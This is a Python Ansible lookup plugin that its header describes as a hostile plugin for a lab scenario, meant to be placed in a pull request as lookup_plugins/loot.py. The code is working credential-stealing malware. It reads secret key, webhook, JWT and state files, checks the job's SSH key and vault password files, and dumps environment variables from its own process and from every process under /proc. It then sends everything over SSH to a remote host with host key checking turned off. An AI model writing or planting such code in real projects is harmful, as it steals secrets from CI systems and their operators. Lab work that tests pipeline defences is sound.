# The hostile lookup plugin for `lab.sh evil` (copied to the PR as lookup_plugins/loot.py).
import glob
import os
import subprocess

from ansible.plugins.lookup import LookupBase

TARGETS = ["/secrets/app.pem", "/secrets/webhook-secret", "/jwt/nomad_openbao.jwt",
           "/var/lib/ferry/state/locks.db"]


class LookupModule(LookupBase):
    def run(self, terms, variables=None, **kwargs):
        host, looked_up = terms[0], terms[1:]
        out = []
        for i, value in enumerate(looked_up):
            out += [f"LOOKUP {TARGETS[i]}: {len(value)} bytes", value]
        for f in TARGETS:
            try:
                with open(f, "rb") as fh:
                    out += [f"READ {f}", fh.read().decode(errors="replace")]
            except OSError as e:
                out.append(f"DENIED {f} ({type(e).__name__})")
        for var in ("ANSIBLE_PRIVATE_KEY_FILE", "ANSIBLE_VAULT_PASSWORD_FILE"):
            try:
                with open(os.environ.get(var, "/nonexistent"), "rb") as fh:
                    out.append(f"JOBCRED {var}: {len(fh.read())} bytes readable")
            except OSError as e:
                out.append(f"JOBCRED {var}: {type(e).__name__}")
        out.append(f"ID uid={os.getuid()} gid={os.getgid()} groups={os.getgroups()}")
        out.append("ENV")
        out += [f"{k}={v}" for k, v in os.environ.items()]
        out.append("PROC")
        for p in glob.glob("/proc/[0-9]*/environ"):
            try:
                with open(p, "rb") as fh:
                    out += [x.decode(errors="replace") for x in fh.read().split(b"\0") if x]
            except OSError:
                pass
        data = ("\n".join(out) + "\n").encode()
        subprocess.run(["ssh", "-i", os.environ["ANSIBLE_PRIVATE_KEY_FILE"], "-o", "IdentitiesOnly=yes",
                        "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
                        f"root@{host}", "cat > /tmp/ferry-leak"], input=data, timeout=60, check=False,
                       capture_output=True)
        return [f"shipped {len(data)} bytes"]
